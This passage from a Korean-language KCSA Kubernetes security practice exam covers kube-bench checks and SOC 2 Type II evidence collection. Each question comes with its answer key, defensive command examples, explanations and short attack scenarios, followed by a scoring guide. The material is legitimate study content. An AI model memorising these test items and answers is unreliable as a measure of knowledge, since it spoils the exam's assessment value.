2018년 GDPR 시행으로 EU 시민의 개인정보를 처리하는 모든 조직에 데이터 보호 의무가 부과되었다. 위반 시 연간 매출의 4% 또는 2천만 유로 중 큰 금액이 과징금으로 부과된다. Kubernetes 환경에서 개인정보가 Secret, ConfigMap, PV에 저장될 수 있으므로, 클러스터 보안 설정이 GDPR 준수에 직접적으로 영향을 미친다.

</details>

### 문제 39.
kube-bench가 점검하는 항목이 아닌 것은?

A) API Server의 보안 플래그 설정
B) etcd의 TLS 설정
C) kubelet의 인증/인가 설정
D) 애플리케이션 코드의 취약점

<details><summary>정답 확인</summary>

**정답: D) 애플리케이션 코드의 취약점 ✅**

kube-bench는 CIS Kubernetes Benchmark에 따라 클러스터 컴포넌트(API Server, etcd, kubelet, 스케줄러, 컨트롤러 매니저)의 보안 설정을 점검한다. 애플리케이션 코드 취약점은 SAST(Static Application Security Testing) 도구나 SCA(Software Composition Analysis) 도구가 담당한다.

**검증:**
```bash
# kube-bench가 점검하는 영역 확인
kube-bench run --targets master,node,etcd,controlplane,policies 2>&1 | grep "\[INFO\]"
# API Server 보안 플래그 점검
kube-bench run --targets master --check 1.2
# etcd TLS 점검
kube-bench run --targets etcd --check 2.1
# kubelet 인증/인가 점검
kube-bench run --targets node --check 4.2
```
```text
# kube-bench 점검 영역:
[INFO] 1 Control Plane Security Configuration
[INFO]   1.1 Control Plane Node Configuration Files  ← 파일 권한 점검
[INFO]   1.2 API Server                              ← 보안 플래그 점검
[INFO]   1.3 Controller Manager                      ← CM 보안 설정
[INFO]   1.4 Scheduler                               ← 스케줄러 보안
[INFO] 2 Etcd Node Configuration                     ← etcd TLS/인증
[INFO] 3 Control Plane Configuration                  ← 인증, RBAC
[INFO] 4 Worker Node Security Configuration           ← kubelet, kube-proxy
[INFO] 5 Kubernetes Policies                          ← PSA, NetworkPolicy, Secret

# 점검하지 않는 영역:
# ❌ 애플리케이션 코드 취약점 (SQL Injection, XSS 등)
# ❌ 컨테이너 이미지 취약점 (CVE)
# ❌ 런타임 이상 행위
```

**오답 분석:**
- A) API Server 보안 플래그 — kube-bench의 핵심 점검 항목이다. `--anonymous-auth`, `--authorization-mode`, `--audit-log-*` 등을 검사한다.
- B) etcd TLS — kube-bench 섹션 2에서 etcd의 `--cert-file`, `--key-file`, `--client-cert-auth`, `--peer-*-file` 등을 점검한다.
- C) kubelet 인증/인가 — kube-bench 섹션 4.2에서 kubelet의 `--anonymous-auth`, `--authorization-mode`, `--read-only-port` 등을 점검한다.

**보안 원리:**
kube-bench는 CIS Benchmark 문서의 각 항목을 자동화된 테스트로 변환한 도구이다. 동작 방식: (1) 노드의 프로세스 목록에서 kube-apiserver, kubelet 등의 명령줄 인수를 파싱한다 (2) 설정 파일(/etc/kubernetes/manifests/*.yaml, /var/lib/kubelet/config.yaml)을 읽어 설정값을 확인한다 (3) 파일 권한(owner, permission)을 점검한다 (4) 기대값과 비교하여 PASS/FAIL/WARN을 결정한다.

**공격 시나리오:**
kube-bench 없이 운영하는 클러스터에서, 관리자가 디버깅을 위해 일시적으로 `--authorization-mode=AlwaysAllow`를 설정하고 원복을 잊는다. 모든 인증된 사용자(포함: 모든 SA)가 클러스터의 모든 리소스에 접근 가능해진다. 주기적인 kube-bench 실행으로 이 설정 변경을 즉시 탐지하여 "1.2.7 FAIL: Ensure that the --authorization-mode argument includes RBAC" 경고가 발생한다.

**등장 배경:**
CIS Benchmark 문서는 PDF로 제공되며 100개 이상의 항목을 수동으로 점검하기 어렵다. Aqua Security가 2017년 kube-bench를 오픈소스로 공개하여 자동화된 벤치마크 점검을 가능하게 하였다. CI/CD 파이프라인이나 CronJob으로 주기적으로 실행하여 설정 드리프트를 탐지하는 패턴이 일반화되었다.

</details>

### 문제 40.
SOC 2 Type II 인증과 관련하여 Kubernetes 환경에서 가장 중요한 것은?

A) Pod 수를 최대한 많이 배포한다
B) 지속적인 보안 통제의 운영 효과성을 입증한다
C) 최신 버전의 Kubernetes를 항상 사용한다
D) 모든 워크로드를 단일 네임스페이스에 배포한다

<details><summary>정답 확인</summary>

**정답: B) 지속적인 보안 통제의 운영 효과성을 입증한다 ✅**

SOC 2 Type II는 일정 기간(보통 6-12개월) 동안 보안 통제가 실제로 효과적으로 운영되었는지를 평가한다. Kubernetes 환경에서는 RBAC 설정, Audit 로그, 네트워크 정책, 취약점 관리, 변경 관리 등의 통제가 지속적으로 운영되고 있음을 문서화하고 입증해야 한다. Prometheus + Grafana 같은 모니터링 시스템의 로그가 증거 자료로 활용된다.

**검증:**
```bash
# SOC 2 관련 Kubernetes 증거 수집 예시
# 1. RBAC 설정 증거
kubectl get clusterrolebindings -o yaml > evidence/rbac-bindings.yaml
# 2. Audit 로그 증거
ls -la /var/log/kubernetes/audit/
# 3. NetworkPolicy 증거
kubectl get networkpolicy -A -o yaml > evidence/network-policies.yaml
# 4. 취약점 스캔 기록
trivy image --format json -o evidence/scan-$(date +%Y%m%d).json nginx:1.25
# 5. 변경 관리 증거 (Git 기록)
git log --since="6 months ago" --oneline k8s-manifests/
```
```text
# SOC 2 Type I vs Type II 비교:
# Type I  — 특정 시점의 통제 설계 적절성 평가 (스냅샷)
# Type II — 일정 기간(6-12개월) 동안 통제의 운영 효과성 평가 (지속)

# SOC 2 Trust Services Criteria (5개 원칙):
# 1. Security (필수)   — RBAC, NetworkPolicy, 암호화, 접근 제어
# 2. Availability      — PDB, HPA, 백업/복구
# 3. Processing Integrity — Admission Control, 입력 검증
# 4. Confidentiality   — Secret 암호화, mTLS, 데이터 분류
# 5. Privacy           — GDPR과 유사한 개인정보 보호

# Kubernetes 환경의 SOC 2 증거 자료 예시:
# - Audit 로그: 접근 기록 6개월분
# - RBAC 변경 이력: Git commit 기록
# - 취약점 스캔 리포트: 월별 스캔 결과
# - 인시던트 대응 기록: PagerDuty/Slack 알림 이력
```

**오답 분석:**
- A) Pod 최대 배포 — Pod 수는 용량 계획 관련이며, SOC 2 보안 통제와 무관하다.
- C) 최신 버전 사용 — 최신 버전 유지는 보안 모범 사례이나, SOC 2의 핵심은 "지속적 운영 효과성 입증"이다. 특정 버전이 아닌 패치 관리 프로세스가 중요하다.
- D) 단일 네임스페이스 배포 — 이는 오히려 격리 부재로 보안을 약화시킨다. SOC 2는 적절한 분리(Separation of Duties)를 요구한다.

**보안 원리:**
SOC 2(Service Organization Control 2)는 AICPA(미국 공인회계사 협회)가 정의한 서비스 조직의 보안 감사 프레임워크이다. Type II의 핵심은 "설계된 통제가 실제로 일정 기간 동안 효과적으로 운영되었는가"이다. 예를 들어, "RBAC로 최소 권한을 적용한다"는 설계(Type I)이고, "지난 6개월간 RBAC 설정 변경 기록과 접근 로그를 제시하여 최소 권한이 유지되었음을 입증한다"가 운영 효과성(Type II)이다.

**공격 시나리오:**
SOC 2 감사 없이 운영하는 SaaS 기업에서, RBAC 정책이 초기에는 최소 권한으로 설계되었으나 시간이 지나면서 편의를 위해 과도한 권한이 추가된다. 6개월 후 내부자가 불필요하게 확장된 권한으로 고객 데이터에 접근하여 유출한다. SOC 2 Type II 감사가 있었다면, 주기적인 RBAC 리뷰에서 권한 변경이 탐지되고 시정되었을 것이다.

**등장 배경:**
SaaS 비즈니스가 확산되면서 고객(특히 엔터프라이즈)이 서비스 제공자의 보안 수준을 평가할 필요가 증가하였다. SOC 2 Type II 인증은 B2B SaaS에서 사실상 필수 자격이 되었다. Kubernetes 기반 인프라를 운영하는 기업이 증가하면서, Kubernetes 보안 설정을 SOC 2 통제 항목에 매핑하는 실무가 정착되었다.

</details>

---

## 채점 및 학습 가이드

### 합격 기준
- KCSA 시험 합격 기준: **67%** (60문항 기준 40문항 이상 정답)

### 도메인별 자가 진단

| 도메인 | 문항 번호 | 맞은 수 / 전체 |
|--------|-----------|----------------|
| Cloud Native Security Overview | 1-6 | /6 |
| Cluster Component Security | 7-15 | /9 |
| Security Fundamentals | 16-24 | /9 |
| Threat Model | 25-30 | /6 |
| Platform Security | 31-36 | /6 |
| Compliance | 37-40 | /4 |
| **합계** | **1-40** | **/40** |

### 약점 보완 전략

- **Cloud Native Security**: 4C 모델, SBOM, Sigstore, DevSecOps 개념을 복습한다
- **Cluster Component Security**: API Server, etcd, kubelet의 보안 플래그를 암기한다
- **Security Fundamentals**: RBAC, NetworkPolicy, PSA YAML을 직접 작성해 본다
- **Threat Model**: STRIDE 모델을 Kubernetes 컴포넌트에 매핑하여 연습한다
- **Platform Security**: Istio mTLS, Cilium, 런타임 보안 도구를 이해한다
- **Compliance**: CIS Benchmark, SOC 2, GDPR의 핵심 개념을 정리한다
